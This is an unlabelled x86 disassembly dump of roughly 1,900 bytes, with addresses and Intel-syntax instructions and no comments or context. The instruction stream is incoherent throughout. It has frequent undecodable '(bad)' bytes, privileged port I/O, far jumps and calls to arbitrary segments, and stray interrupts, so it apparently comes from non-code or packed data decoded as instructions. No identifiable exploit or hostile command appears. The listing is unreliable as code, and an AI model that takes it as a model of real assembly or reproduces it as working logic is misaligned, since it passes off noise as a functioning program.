  424c4e:	and    al,dl
  424c50:	shr    edi,0x23
  424c53:	cli    
  424c54:	in     eax,0xdb
  424c56:	adc    DWORD PTR [edx-0x16],eax
  424c59:	inc    eax
  424c5a:	sub    dh,ch
  424c5c:	pop    es
  424c5d:	lea    edi,[edx-0x7368149b]
  424c63:	mov    al,ds:0x9b535c2c
  424c68:	imul   edx,edx,0x8e42993
  424c6e:	or     al,0xe9
  424c70:	rcr    DWORD PTR [ebx],cl
  424c72:	inc    ebx
  424c73:	pop    eax
  424c74:	ja     0x424c53
  424c76:	xchg   ebx,eax
  424c77:	test   al,0x3a
  424c7a:	outs   dx,BYTE PTR ds:[esi]
  424c7b:	cmp    eax,0x2a72670a
  424c80:	push   es
  424c81:	and    al,dl
  424c83:	imul   edi,DWORD PTR [edi-0x67],0x8
  424c87:	clc    
  424c88:	es adc al,0xc1
  424c8b:	loop   0x424c6e
  424c8d:	imul   DWORD PTR [ebx-0x3d]
  424c90:	cmp    BYTE PTR [ebp-0x2a],dh
  424c93:	cmp    DWORD PTR [esp+ecx*1-0x77],esi
  424c97:	popf   
  424c98:	mov    ds:0x25bd93c6,eax
  424c9d:	sbb    ah,dh
  424c9f:	fwait
  424ca0:	pop    esp
  424ca1:	test   esp,edx
  424ca3:	add    al,0x15
  424ca5:	cdq    
  424ca6:	shr    DWORD PTR [edx],cl
  424ca8:	std    
  424ca9:	xor    BYTE PTR [ecx],ch
  424cab:	fdivp  st(5),st
  424cad:	mov    ebp,0x7bcd2514
  424cb2:	(bad)  
  424cb3:	jno    0x424d08
  424cb5:	xchg   ebx,eax
  424cb6:	dec    ebx
  424cb7:	mov    WORD PTR [ecx+0x721682bf],es
  424cbd:	inc    ebx
  424cbe:	ret    0x5991
  424cc1:	fcomp  QWORD PTR [edx-0x3a]
  424cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424cc5:	jne    0x424cb8
  424cc7:	mov    ds,WORD PTR [ebx-0x62fa9a3d]
  424ccd:	add    eax,0x7527fc88
  424cd2:	popa   
  424cd3:	push   ebx
  424cd4:	jno    0x424c57
  424cd6:	mov    DWORD PTR [ecx-0x63056adb],ebp
  424cdc:	fs stos BYTE PTR es:[edi],al
  424cde:	mov    ds:0x37b7299e,al
  424ce3:	clc    
  424ce4:	cld    
  424ce5:	fsub   QWORD PTR [ebp-0xd]
  424ce8:	dec    ecx
  424ce9:	xor    cl,dh
  424ceb:	sbb    ecx,DWORD PTR [edi]
  424ced:	pushf  
  424cee:	push   0x6a1c19d4
  424cf3:	and    bl,BYTE PTR [eax-0x1398af12]
  424cf9:	cmp    eax,0xbd21b7cd
  424cfe:	sub    bl,BYTE PTR [edx]
  424d00:	adc    eax,0x608fd3f1
  424d05:	lds    eax,FWORD PTR [eax]
  424d07:	push   eax
  424d08:	sar    ebp,cl
  424d0a:	(bad)  
  424d0c:	sbb    BYTE PTR [ebx+0x197f679c],0x73
  424d13:	or     esi,DWORD PTR [ebp-0x8]
  424d16:	aas    
  424d17:	das    
  424d18:	jbe    0x424d5c
  424d1a:	adc    DWORD PTR [edi-0xb197885],esi
  424d20:	(bad)  
  424d21:	fimul  WORD PTR [esp+ebp*8]
  424d24:	outs   dx,BYTE PTR ds:[esi]
  424d25:	call   0x345b:0x7114ff94
  424d2c:	in     al,0x4e
  424d2e:	jbe    0x424d40
  424d30:	pop    edi
  424d31:	rcl    esp,cl
  424d33:	(bad)  
  424d35:	jo     0x424d28
  424d37:	dec    esi
  424d38:	unpckhps xmm3,XMMWORD PTR [edi+0x50]
  424d3c:	jl     0x424d33
  424d3e:	nop
  424d3f:	add    al,0x95
  424d41:	inc    ebp
  424d42:	adc    ah,BYTE PTR [eax+0x3c]
  424d45:	shr    DWORD PTR [ebx+0x63],0xc0
  424d49:	pop    ebp
  424d4a:	arpl   WORD PTR [edi+edx*1+0x11],di
  424d4e:	lahf   
  424d4f:	or     eax,0xbcc4db97
  424d54:	in     al,0x19
  424d56:	xor    ebx,ebx
  424d58:	mov    ebp,0xe57564c7
  424d5d:	push   0xffffffb8
  424d5f:	(bad)  
  424d61:	sub    ebp,0x70
  424d64:	repz sti 
  424d66:	xchg   esp,eax
  424d67:	ss mov ebx,0x9315374a
  424d6d:	cld    
  424d6e:	adc    DWORD PTR [edx+0x7b],ebp
  424d71:	xor    al,0x71
  424d73:	dec    ecx
  424d74:	sub    esp,DWORD PTR [esi]
  424d76:	mov    al,0xb5
  424d78:	fdiv   st(3),st
  424d7a:	or     BYTE PTR [ecx-0x7d7cc307],bl
  424d80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d81:	push   edi
  424d82:	jo     0x424d50
  424d84:	stc    
  424d85:	mov    ds:0x2cbb88e3,al
  424d8a:	add    al,0x5b
  424d8c:	ss call 0x8fb6:0x3c8dadf7
  424d94:	adc    esi,0x1e98346d
  424d9a:	inc    edi
  424d9b:	sub    ch,dh
  424d9d:	jl     0x424dbb
  424d9f:	jge    0x424dda
  424da1:	bound  edx,QWORD PTR [edx+0x2e9edd6b]
  424da7:	in     eax,dx
  424da8:	sub    al,0xd5
  424daa:	mov    ds:0x93c54e1f,eax
  424daf:	fidiv  DWORD PTR [ecx-0xb]
  424db2:	in     al,dx
  424db3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424db4:	leave  
  424db5:	inc    ecx
  424db6:	or     DWORD PTR [ebx+0x34b93832],0xffffffb7
  424dbd:	dec    edx
  424dbe:	retf   0x5dea
  424dc1:	mov    eax,ds:0x904d60bc
  424dc6:	(bad)  
  424dc7:	test   DWORD PTR [ebx],eax
  424dc9:	and    DWORD PTR [ebp-0x45],eax
  424dcc:	xchg   edx,eax
  424dcd:	out    dx,eax
  424dce:	test   cl,dl
  424dd0:	test   al,0xb5
  424dd2:	adc    esi,DWORD PTR [ebp-0x61d66aba]
  424dd8:	frstor ds:0x8283a2ec
  424dde:	pusha  
  424ddf:	aad    0x7
  424de1:	or     DWORD PTR [esi-0x6e],edx
  424de4:	xor    BYTE PTR [ecx+0x2d],ah
  424de7:	xchg   esp,eax
  424de8:	pushf  
  424de9:	xor    al,ah
  424deb:	xchg   edi,eax
  424dec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ded:	or     ecx,DWORD PTR [esi+0x33]
  424df0:	aas    
  424df1:	mov    WORD PTR [eax-0x63],ss
  424df4:	and    esp,DWORD PTR [ecx-0xc]
  424df7:	test   al,0xb2
  424df9:	loopne 0x424e79
  424dfb:	mov    ds:0x6ccd6005,eax
  424e00:	mov    ch,0x89
  424e02:	jg     0x424dfc
  424e04:	call   DWORD PTR [eax-0x19111412]
  424e0a:	xor    DWORD PTR [edi+0x4dd7cc5e],0xffffffd1
  424e11:	mov    esi,0x8f81213c
  424e16:	mov    esp,0x20b240bd
  424e1b:	cmp    DWORD PTR [eax+0x58076b55],esi
  424e21:	shl    BYTE PTR [edi+0x1f069c59],cl
  424e27:	xor    dh,BYTE PTR [ebp-0x5]
  424e2a:	adc    esp,DWORD PTR [esi+0x4bf9f35d]
  424e30:	popf   
  424e31:	xor    cl,BYTE PTR [eax]
  424e33:	push   esi
  424e34:	pushf  
  424e35:	and    DWORD PTR [edx+0x8],esp
  424e38:	rol    DWORD PTR [edi-0x227ff41d],0xd1
  424e3f:	imul   ecx,DWORD PTR [edx],0x7ffca96d
  424e45:	nop
  424e46:	add    bh,BYTE PTR [ebx-0x1c]
  424e49:	add    esi,DWORD PTR ds:0x6941bd61
  424e4f:	retf   0x1f13
  424e52:	enter  0x826b,0xb0
  424e56:	stos   BYTE PTR es:[edi],al
  424e57:	adc    al,0x1f
  424e59:	shl    DWORD PTR [esi],1
  424e5b:	sbb    bh,BYTE PTR [eax+0x1b7ca651]
  424e61:	or     DWORD PTR [esi-0x7b],esp
  424e64:	and    al,0x89
  424e66:	mov    bl,0x3e
  424e68:	popf   
  424e69:	nop
  424e6a:	iret   
  424e6b:	and    BYTE PTR cs:[ebx-0x3160633b],0xa1
  424e73:	sahf   
  424e74:	sbb    eax,0xd730548
  424e79:	or     edi,0x52002c4b
  424e7f:	sub    esi,DWORD PTR [edi]
  424e81:	xchg   ebx,eax
  424e82:	xchg   esi,eax
  424e83:	call   0xebba:0xefbae522
  424e8a:	mov    esi,DWORD PTR [ecx+0x55]
  424e8d:	call   0x2fc7b161
  424e92:	xchg   ebp,eax
  424e93:	pop    es
  424e94:	push   ebp
  424e95:	dec    ecx
  424e96:	sub    al,bl
  424e98:	fwait
  424e99:	cdq    
  424e9a:	out    0xaa,al
  424e9c:	and    DWORD PTR [esi],edx
  424e9e:	cmp    eax,0xb296b864
  424ea3:	bound  esp,QWORD PTR [eax]
  424ea5:	jmp    0x424e49
  424ea7:	les    ebp,FWORD PTR [esi+ecx*2]
  424eaa:	push   ecx
  424eab:	retf   
  424eac:	mov    cl,0xc0
  424eae:	ret    0x4fe5
  424eb1:	or     eax,edi
  424eb3:	iret   
  424eb4:	(bad)  
  424eb5:	pop    es
  424eb6:	out    0x60,eax
  424eb8:	jmp    0x564da046
  424ebd:	test   eax,0x5e94ebf7
  424ec2:	ror    dl,0x6c
  424ec5:	lock jbe 0x424efd
  424ec8:	(bad)  [ebp-0x9]
  424ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ecc:	or     eax,0x22ad0689
  424ed1:	es inc edi
  424ed3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ed4:	sub    bh,BYTE PTR [ebp+ebp*8+0x30]
  424ed8:	call   0x66676882
  424edd:	mov    esi,edi
  424edf:	shl    dl,1
  424ee1:	add    esi,DWORD PTR [edi]
  424ee3:	add    edx,ecx
  424ee5:	hlt    
  424ee6:	pop    edx
  424ee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ee8:	inc    edi
  424ee9:	test   DWORD PTR [ebp+0x0],ebx
  424eec:	(bad)  
  424eef:	outs   dx,DWORD PTR ds:[esi]
  424ef0:	ins    BYTE PTR es:[edi],dx
  424ef1:	ror    BYTE PTR [eax+edx*8-0x2c],cl
  424ef5:	sub    al,0x38
  424ef7:	stos   DWORD PTR es:[edi],eax
  424ef8:	addr16 jbe 0x424f40
  424efb:	mov    edx,0x9837b428
  424f00:	and    cl,BYTE PTR [ebx-0x56]
  424f03:	or     edx,ebx
  424f05:	jnp    0x424f12
  424f07:	aaa    
  424f08:	sar    al,cl
  424f0a:	pop    ebx
  424f0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f0c:	repz bnd je 0x424f4d
  424f10:	sub    esi,DWORD PTR ds:0x13268196
  424f16:	test   BYTE PTR [eax-0x21587121],bl
  424f1c:	call   0x4a48:0x2e4ffe71
  424f23:	in     al,0xc5
  424f25:	inc    ebp
  424f26:	or     edi,edx
  424f28:	jo     0x424f6c
  424f2a:	ret    0xc9f6
  424f2d:	xchg   esp,eax
  424f2e:	pop    ebp
  424f2f:	int    0xc8
  424f31:	cmp    ebx,esi
  424f33:	js     0x424f13
  424f35:	push   ebp
  424f36:	mov    gs,WORD PTR [edi]
  424f38:	jmp    0x424f6f
  424f3a:	mov    al,0xe4
  424f3c:	pusha  
  424f3d:	sbb    ah,BYTE PTR [edx+0x36]
  424f40:	jns    0x424f0a
  424f42:	and    al,0xc3
  424f44:	mov    ebp,0x38ad3214
  424f49:	retf   
  424f4a:	(bad)  
  424f4c:	gs in  al,dx
  424f4e:	dec    esi
  424f4f:	lods   al,BYTE PTR ds:[esi]
  424f50:	sbb    ah,al
  424f52:	jl     0x424ef7
  424f54:	ret    0x8c28
  424f57:	lahf   
  424f58:	or     al,0x93
  424f5a:	lea    edi,[edi+ecx*2+0x6e]
  424f5e:	cmp    dl,BYTE PTR [edx-0x32822870]
  424f64:	jecxz  0x424f34
  424f66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f67:	jl     0x424f06
  424f69:	not    DWORD PTR [edx]
  424f6b:	jnp    0x424fa8
  424f6d:	pop    es
  424f6e:	imul   eax,ecx,0xb7c283af
  424f74:	dec    eax
  424f75:	mov    dh,0x66
  424f77:	or     eax,0xa37a2d60
  424f7c:	fldcw  WORD PTR ds:0xf363d451
  424f82:	sub    esi,DWORD PTR [ebx-0x6b]
  424f85:	popa   
  424f86:	cdq    
  424f87:	icebp  
  424f88:	and    esp,ebp
  424f8a:	and    DWORD PTR [edx-0x23],esi
  424f8d:	in     eax,dx
  424f8e:	push   es
  424f8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f90:	dec    ecx
  424f91:	lahf   
  424f92:	pop    esi
  424f93:	or     al,BYTE PTR [eax]
  424f95:	cwde   
  424f96:	stc    
  424f97:	cld    
  424f98:	(bad)  
  424f9a:	mov    ds:0xc39b2786,eax
  424f9f:	in     al,0x98
  424fa1:	sbb    edi,esi
  424fa3:	outs   dx,DWORD PTR ds:[esi]
  424fa4:	loop   0x42500e
  424fa6:	and    bh,BYTE PTR [ecx+0x62]
  424fa9:	mov    ebp,0x6ddf1c4c
  424fae:	mov    bh,0x59
  424fb0:	mov    ah,cl
  424fb2:	adc    dl,ah
  424fb4:	in     al,0xf7
  424fb6:	cmc    
  424fb7:	out    0xd5,eax
  424fb9:	fsubr  st(3),st
  424fbb:	fwait
  424fbc:	in     eax,0xdf
  424fbe:	shl    DWORD PTR [bp+si],cl
  424fc1:	jo     0x424f4d
  424fc3:	arpl   bp,ax
  424fc5:	xsha1  (bad)
  424fc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fc7:	or     dl,BYTE PTR [ecx-0x38]
  424fca:	(bad)  
  424fcc:	jmp    0x8a7c:0xc9eba872
  424fd3:	stc    
  424fd4:	(bad)  
  424fd5:	mov    edi,0xa91c597c
  424fda:	cmp    DWORD PTR [edx],ecx
  424fdc:	xchg   ecx,eax
  424fdd:	enter  0x5f0a,0x7e
  424fe1:	aas    
  424fe2:	lock sbb BYTE PTR ds:0x6708d282,dh
  424fe9:	jecxz  0x424f98
  424feb:	mov    eax,0x446c2918
  424ff0:	je     0x425067
  424ff2:	mov    esi,0xc3d0d29e
  424ff7:	mov    ecx,0xe2edba25
  424ffc:	addr16 stc 
  424ffe:	push   eax
  424fff:	xor    edx,ecx
  425001:	push   0xae41d251
  425006:	mov    ebx,0xacf47632
  42500b:	push   ss
  42500c:	inc    eax
  42500d:	pop    eax
  42500e:	pop    ebp
  42500f:	dec    eax
  425010:	or     BYTE PTR [ecx-0x77d5d3aa],bl
  425016:	les    edx,FWORD PTR [ecx]
  425018:	jns    0x425003
  42501a:	(bad)  
  42501b:	out    0xa2,al
  42501d:	sub    bh,al
  42501f:	(bad)  
  425020:	adc    dl,BYTE PTR [ebx+ebx*8]
  425023:	scas   eax,DWORD PTR es:[edi]
  425024:	ja     0x425031
  425026:	enter  0x8fbe,0x1d
  42502a:	daa    
  42502b:	or     edx,ebx
  42502d:	sar    BYTE PTR [eax+0x74],0x75
  425031:	adc    esi,DWORD PTR [ecx+0x40]
  425034:	cmp    eax,0xe6c632fa
  425039:	(bad)  
  42503a:	fyl2x  
  42503c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42503d:	dec    esi
  42503e:	sub    BYTE PTR ds:0xe099584f,dh
  425044:	jle    0x424ff7
  425046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425047:	out    0xb1,eax
  425049:	and    al,0xd
  42504b:	push   es
  42504c:	in     al,0xfc
  42504e:	fs dec ebp
  425050:	(bad)  
  425051:	mov    esi,gs
  425053:	test   BYTE PTR [edx],0xd0
  425056:	stc    
  425057:	sbb    edx,DWORD PTR [ecx]
  425059:	push   edi
  42505a:	aaa    
  42505b:	xor    ah,cl
  42505d:	in     eax,dx
  42505e:	mov    ebp,0x87c5c09b
  425063:	jecxz  0x425055
  425065:	pop    esi
  425066:	pop    eax
  425067:	dec    eax
  425068:	xlat   BYTE PTR ds:[ebx]
  425069:	push   ds
  42506a:	mov    eax,0xc1f4276f
  42506f:	call   0x633d92e7
  425074:	bound  ebx,QWORD PTR [esi]
  425076:	sub    ebx,DWORD PTR [ebx]
  425078:	daa    
  425079:	xor    al,BYTE PTR [eax-0x33]
  42507c:	jl     0x42508f
  42507e:	sub    DWORD PTR [ebp+0x73],edi
  425081:	inc    edx
  425082:	fstp   QWORD PTR gs:[ebx+eiz*1+0x110fe0dc]
  42508a:	pop    edx
  42508b:	inc    esp
  42508c:	test   eax,0xaa598fde
  425091:	scas   al,BYTE PTR es:[edi]
  425092:	dec    ebx
  425093:	jns    0x42503f
  425095:	sub    cl,BYTE PTR [edi]
  425097:	pop    edi
  425098:	jg     0x425061
  42509a:	xchg   ebp,eax
  42509b:	xchg   ecx,eax
  42509c:	popf   
  42509d:	dec    esi
  42509e:	call   0x5c640209
  4250a3:	mov    eax,0xfea58108
  4250a8:	loopne 0x4250e4
  4250aa:	shl    cl,0xbe
  4250ad:	lahf   
  4250ae:	push   ebp
  4250af:	sbb    ecx,DWORD PTR [edx+edi*1-0x42a445d8]
  4250b6:	push   ss
  4250b7:	ror    dh,0xa1
  4250ba:	lea    ebx,[ebx-0x7d]
  4250bd:	shr    BYTE PTR [edx],0xb4
  4250c0:	inc    esp
  4250c1:	jmp    0x4250a9
  4250c3:	dec    eax
  4250c4:	xchg   ebp,eax
  4250c5:	pop    esp
  4250c6:	scas   eax,DWORD PTR es:[edi]
  4250c7:	mov    eax,esi
  4250c9:	push   ds
  4250ca:	cld    
  4250cb:	mov    BYTE PTR [eax-0x1ad5c3dd],ch
  4250d1:	dec    ecx
  4250d2:	sub    al,0x6f
  4250d4:	cmp    eax,0xd24ed827
  4250d9:	ins    BYTE PTR es:[edi],dx
  4250da:	lods   eax,DWORD PTR ds:[esi]
  4250db:	or     al,0xfb
  4250dd:	imul   edi,DWORD PTR [ecx-0x793b3e4f],0x75
  4250e4:	aaa    
  4250e5:	add    edx,DWORD PTR [ecx]
  4250e7:	mov    ebx,0x265930ff
  4250ec:	xchg   ebx,eax
  4250ed:	sub    ebp,esp
  4250ef:	push   ds
  4250f0:	clc    
  4250f1:	pop    esp
  4250f2:	outs   dx,BYTE PTR ds:[esi]
  4250f3:	or     DWORD PTR ds:0xe4137ba1,0x48d05f0b
  4250fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4250ff:	in     eax,dx
  425100:	push   ds
  425101:	stc    
  425102:	xchg   ecx,eax
  425103:	sub    eax,DWORD PTR [eax]
  425105:	add    BYTE PTR [eax],al
  425107:	add    BYTE PTR [eax],al
  425109:	add    BYTE PTR [ecx+0x55],bl
  42510c:	push   esp
  42510d:	push   edx
  42510e:	pop    esp
  42510f:	push   ebx
  425110:	pop    edi
  425111:	pop    edi
  425112:	xchg   ebx,eax
  425113:	stos   DWORD PTR es:[edi],eax
  425114:	mov    ebx,0x5d83d096
  425119:	in     eax,dx
  42511a:	out    dx,al
  42511b:	fiadd  WORD PTR [ecx]
  42511d:	add    BYTE PTR [edx-0x45fffffa],al
  425123:	mov    esp,0x99d330fa
  425128:	mov    DWORD PTR [esi-0x17004ace],eax
  42512e:	sahf   
  42512f:	xchg   edx,eax
  425130:	repnz push 0x26
  425133:	push   0xfca7a2c5
  425138:	pop    eax
  425139:	out    0x0,eax
  42513b:	sbb    DWORD PTR gs:[ebp-0x6429c091],ebp
  425142:	push   edx
  425143:	in     eax,0x62
  425145:	std    
  425146:	fiadd  DWORD PTR [ebx-0x3]
  425149:	js     0x4251b9
  42514b:	div    DWORD PTR [ebx+0x3b347a16]
  425151:	sub    al,0x9d
  425153:	cmp    esp,edi
  425155:	shr    cl,0x46
  425158:	or     BYTE PTR [edx+ebp*2],al
  42515b:	mov    WORD PTR [ebp*1-0x53be632],gs
  425162:	add    eax,0x9c01f3c5
  425167:	pushf  
  425168:	outs   dx,DWORD PTR ds:[esi]
  425169:	pop    ebx
  42516a:	lahf   
  42516b:	cmp    dh,dl
  42516d:	xchg   ebx,eax
  42516e:	mov    al,ds:0xe86b1ae3
  425173:	mov    es,ebp
  425175:	mov    ecx,0x584f5d26
  42517b:	sub    al,0x7f
  42517d:	js     0x42519b
  42517f:	arpl   WORD PTR [eax],bp
  425181:	fbld   TBYTE PTR [esi]
  425183:	test   DWORD PTR [edi-0x4824ab0a],ebp
  425189:	pushf  
  42518a:	out    dx,al
  42518b:	mov    BYTE PTR [edi],dl
  42518d:	or     ebx,ebx
  42518f:	(bad)  
  425190:	fild   DWORD PTR [ebp-0x1c]
  425193:	mov    dl,0x54
  425195:	xchg   DWORD PTR [edx-0x1],ebp
  425198:	push   edx
  425199:	into   
  42519a:	mov    ebp,0x968e2040
  42519f:	iret   
  4251a0:	xor    esi,eax
  4251a2:	sub    ah,BYTE PTR [ebx+0x1dbcf89b]
  4251a8:	sub    bl,ah
  4251aa:	push   edx
  4251ab:	adc    BYTE PTR [edi-0x4a],al
  4251ae:	sub    al,0xc3
  4251b0:	xchg   edx,eax
  4251b1:	outs   dx,BYTE PTR ds:[esi]
  4251b2:	gs inc ecx
  4251b4:	fs sbb eax,0xc9761d90
  4251ba:	sets   BYTE PTR [eax]
  4251bd:	add    BYTE PTR [edi+0x39365d9c],0xee
  4251c4:	or     bl,BYTE PTR [ebx]
  4251c6:	xor    ah,BYTE PTR [esi+0x3f2fcd80]
  4251cc:	(bad)  
  4251cd:	mov    ebp,0x4aaa29b9
  4251d2:	pusha  
  4251d3:	iret   
  4251d4:	jne    0x42521f
  4251d6:	mov    cs,WORD PTR [edi+ecx*2]
  4251d9:	rol    BYTE PTR [ebp+edx*1+0x2c],cl
  4251dd:	cmp    dl,bl
  4251df:	inc    edi
  4251e0:	and    al,bl
  4251e2:	cdq    
  4251e3:	aaa    
  4251e4:	push   esp
  4251e5:	sub    esi,DWORD PTR [ebx-0x79ba6807]
  4251eb:	fcomp  DWORD PTR [ecx+0x7a58bfa7]
  4251f1:	push   esp
  4251f2:	ins    BYTE PTR es:[edi],dx
  4251f3:	cwde   
  4251f4:	imul   esi,DWORD PTR [ecx+0x13],0x1fd4c1ab
  4251fb:	push   ebx
  4251fc:	xor    cl,BYTE PTR [ecx]
  4251fe:	cmc    
  4251ff:	or     bh,BYTE PTR [ebx-0x5e]
  425202:	sti    
  425203:	pop    edx
  425204:	icebp  
  425205:	call   0x3a34d5be
  42520a:	or     DWORD PTR [eax],ebx
  42520c:	bound  esi,QWORD PTR [edi+eax*2-0x41]
  425210:	test   al,0x27
  425212:	data16 arpl WORD PTR ds:0x176fa18,di
  425219:	push   ebp
  42521a:	jbe    0x425205
  42521c:	call   0xeb87e291
  425221:	retf   0xaa5a
  425224:	mov    bl,0xc1
  425226:	aas    
  425227:	xchg   esp,eax
  425228:	jg     0x425258
  42522a:	pop    edx
  42522b:	adc    eax,0xcc7c3182
  425230:	cs int3 
  425232:	dec    edx
  425233:	popf   
  425234:	scas   al,BYTE PTR es:[edi]
  425235:	test   DWORD PTR ds:0x79a49ea0,edi
  42523b:	scas   eax,DWORD PTR es:[edi]
  42523c:	add    eax,0xdb0f88a7
  425241:	nop    DWORD PTR [esi-0x3686430e]
  425248:	mov    esi,0x2f6258dd
  42524d:	fucomi st,st(2)
  42524f:	lods   eax,DWORD PTR ds:[esi]
  425250:	stc    
  425251:	mov    ch,0xcc
  425253:	push   edi
  425254:	add    al,0x39
  425256:	(bad)  
  425258:	loop   0x42524d
  42525a:	sub    cl,bl
  42525c:	js     0x4251fe
  42525e:	jecxz  0x4252ab
  425260:	jle    0x425263
  425262:	call   0xc1f16066
  425267:	mov    WORD PTR [ebx],?
  425269:	shl    DWORD PTR [edi-0x53],0x87
  42526d:	mov    edi,0xf1db914e
  425272:	in     eax,0xbc
  425274:	mov    esp,0x7c198b3f
  425279:	jmp    0x425228
  42527b:	or     eax,0x8e3641a0
  425280:	pop    ss
  425281:	pop    es
  425282:	sub    al,0x15
  425284:	mov    eax,0xfaf5e524
  425289:	retf   
  42528a:	push   0xffffffcb
  42528c:	int    0xe9
  42528e:	pop    edi
  42528f:	adc    al,0x77
  425291:	cmp    BYTE PTR [edi-0x66e07f8e],ch
  425297:	inc    ebp
  425298:	push   esp
  425299:	mov    BYTE PTR [eax],bh
  42529b:	inc    ecx
  42529c:	push   es
  42529d:	dec    ebp
  42529e:	loop   0x4252e3
  4252a0:	inc    eax
  4252a1:	adc    al,dl
  4252a3:	jg     0x42528d
  4252a5:	adc    esi,esi
  4252a7:	outs   dx,BYTE PTR ds:[esi]
  4252a8:	mov    BYTE PTR [ecx-0x34028546],ch
  4252ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252af:	mov    ds:0xbc8381b4,al
  4252b4:	pop    ds
  4252b5:	aas    
  4252b6:	xchg   ebp,eax
  4252b7:	jnp    0x4252ea
  4252b9:	pop    esp
  4252ba:	cmp    bh,ch
  4252bc:	out    0x99,al
  4252be:	or     al,0xd4
  4252c0:	xchg   ebx,eax
  4252c1:	push   edi
  4252c2:	add    cl,BYTE PTR [esi-0x38]
  4252c5:	cmp    dl,dh
  4252c7:	jb     0x42531d
  4252c9:	imul   esp,DWORD PTR [eax],0x4978837a
  4252cf:	ret    0x646c
  4252d2:	retf   
  4252d3:	popf   
  4252d4:	jecxz  0x425312
  4252d6:	jp     0x425300
  4252d8:	push   0xad4651e9
  4252dd:	xlat   BYTE PTR ds:[ebx]
  4252de:	psrlw  mm0,mm2
  4252e1:	jg     0x42529f
  4252e3:	pop    ss
  4252e4:	cmp    eax,0xf83fbd1d
  4252e9:	jmp    0x42534b
  4252eb:	mov    DWORD PTR [edi+0x35],esi
  4252ee:	sub    BYTE PTR [esi],dl
  4252f0:	lahf   
  4252f1:	push   edi
  4252f2:	test   DWORD PTR [edx+0x35d13973],edi
  4252f8:	jae    0x4252a2
  4252fa:	mov    ecx,0x714b9950
  4252ff:	out    0x59,al
  425301:	rcr    BYTE PTR [edi],cl
  425303:	xchg   edi,eax
  425304:	xchg   bx,ax
  425306:	xchg   esp,eax
  425307:	enter  0x5da9,0xaf
  42530b:	jns    0x42537b
  42530d:	inc    edi
  42530e:	push   ecx
  42530f:	mov    bl,0xc
  425311:	mov    ds:0x4ce9b727,al
  425316:	pop    ebp
  425317:	inc    edi
  425318:	sahf   
  425319:	cld    
  42531a:	mov    ch,0x4c
  42531c:	cmp    eax,DWORD PTR [ebp-0x7c9eacb7]
  425322:	pop    ebp
  425323:	jl     0x42538e
  425325:	mov    ebp,0xeeceae18
  42532a:	outs   dx,DWORD PTR ds:[esi]
  42532b:	xor    BYTE PTR [ecx+0x8],al
  42532e:	mov    bl,0x47
  425330:	lds    ecx,FWORD PTR [ecx]
  425332:	push   0xffffffb9
  425334:	cdq    
  425335:	cdq    
  425336:	ss daa 
  425338:	inc    edx
  425339:	xchg   cl,ah
  42533b:	inc    ecx
  42533c:	test   BYTE PTR [ecx+0x63af457],al
  425342:	scas   eax,DWORD PTR es:[edi]
  425343:	fs call 0x20cbd70c
  425349:	cmp    al,0x75
  42534c:	icebp  
  42534d:	xchg   esi,eax
  42534e:	rcr    DWORD PTR [ecx+0x12f6ae27],cl
  425354:	fmul   st,st(7)
  425356:	ficom  DWORD PTR [eax+0x3f]
  425359:	adc    al,0x6c
  42535b:	push   ebp
  42535c:	loop   0x42534e
  42535e:	lods   al,BYTE PTR ds:[esi]
  42535f:	cmp    bh,BYTE PTR [eax+0x71ac4274]
  425365:	add    edi,DWORD PTR ds:0x6fe06da9
  42536b:	je     0x425327
  42536d:	fwait
  42536e:	sahf   
  42536f:	xor    al,0x16
  425371:	call   0x7a46:0xad453118
  425378:	jnp    0x425314
  42537a:	mov    esp,0x17417a7a
  42537f:	and    edi,DWORD PTR [edx+edi*2+0x4f]
  425383:	or     al,0x3d
  425385:	mov    bl,0xcc
  425387:	aad    0x27
  425389:	pop    edi
  42538a:	dec    edi
  42538b:	pop    ebx
  42538c:	sbb    al,0x18
  42538e:	mov    al,ds:0xe6ece02e
  425393:	repz inc ebx
  425395:	neg    esi
  425397:	lods   eax,DWORD PTR ds:[esi]
  425398:	sub    DWORD PTR [bx],edi
  42539b:	out    0x7b,al
  42539d:	jmp    0x678f:0xdbbad6ec
  4253a4:	cmp    al,0xb7
  4253a6:	jl     0x425378
  4253a8:	cmp    al,0x88
  4253aa:	into   
  4253ab:	mov    esi,0x2bf3ccbe
  4253b0:	in     eax,0xae
  4253b2:	ins    BYTE PTR es:[edi],dx
  4253b3:	jno    0x4253f9
  4253b5:	cmp    al,0x67
  4253b7:	retf   
  4253b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253b9:	sahf   
  4253ba:	mov    al,BYTE PTR [esi]
  4253bc:	jmp    0x4253ce
  4253be:	mov    dl,BYTE PTR [eax-0x23]
  4253c1:	fist   DWORD PTR [esi]
  4253c3:	xchg   DWORD PTR [ebx],edx
  4253c5:	xchg   DWORD PTR [edi+0x7578a8d],edx
  4253cb:	cmp    BYTE PTR [ebp+esi*8+0x7c],ah
  4253cf:	aas    
  4253d0:	mov    ebx,0xb79e66db
  4253d5:	shl    DWORD PTR ds:0x3e8f46b6,cl
  4253db:	xor    BYTE PTR [edx-0x33c30c0e],0xe5
  4253e2:	dec    edi
  4253e3:	fdivr  DWORD PTR [edi]
  4253e5:	add    edi,DWORD PTR ds:0x8a8b7f11
  4253eb:	mov    ds:0x268aa515,eax
  4253f0:	mov    dh,0x89
  4253f2:	(bad)  
  4253f3:	sbb    al,0x22
  4253f5:	push   es
  4253f6:	pop    edi
  4253f7:	gs icebp 
  4253f9:	xchg   edx,eax
  4253fa:	pop    esi
  4253fb:	mov    bh,0x98
  4253fd:	outs   dx,DWORD PTR ds:[esi]
  4253fe:	pusha  
  4253ff:	cmp    eax,0x4957c544
